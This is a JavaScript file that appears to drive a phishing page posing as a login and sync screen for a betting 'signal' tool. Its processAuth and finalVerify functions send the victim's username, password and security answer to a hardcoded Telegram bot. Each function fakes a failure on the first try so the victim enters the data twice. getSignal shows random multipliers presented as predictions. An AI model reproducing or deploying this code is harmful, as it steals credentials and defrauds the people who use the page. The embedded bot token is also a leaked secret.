const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let securityAttempts = 0;

function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;
    btn.disabled = true;
    btn.innerText = "Verifying...";

    // إرسال سريع بلا انتظار
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ محاولة: %0AUser: ${u}%0APass: ${p}`);

    setTimeout(() => {
        if (loginAttempts === 1) {
            document.getElementById('status-text').innerText = "❌ فشل: أعد المحاولة";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        } else {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('security-layer').style.display = 'flex';
        }
    }, 1000);
}

function finalVerify() {
    const ans = document.getElementById('sec_ans').value;
    const btn = document.getElementById('sec-btn');
    
    if (ans.length < 2) return alert("أدخل الإجابة!");

    securityAttempts++;
    btn.disabled = true;
    btn.innerText = "...Synchronizing";

    // إرسال اللقب فوراً بلا انتظار رد السيرفر
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔑 SECRET: ${ans}`);

    // الانتقال الإجباري بعد ثانية واحدة (مستحيل يحبس هنا)
    setTimeout(() => {
        if (securityAttempts === 1) {
            document.getElementById('sec_ans').value = "";
            btn.disabled = false;
            btn.innerText = "Confirm & Unlock";
            alert("خطأ في المزامنة: أعد كتابة اللقب بدقة!");
        } else {
            // غلق الواجهة الحمراء وفتح الرادار بالسيف
            document.getElementById('security-layer').setAttribute("style", "display: none !important");
            const mainApp = document.getElementById('main-app');
            mainApp.style.display = 'flex';
            mainApp.classList.remove('hidden');
        }
    }, 1000); 
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
    }, 800);
}
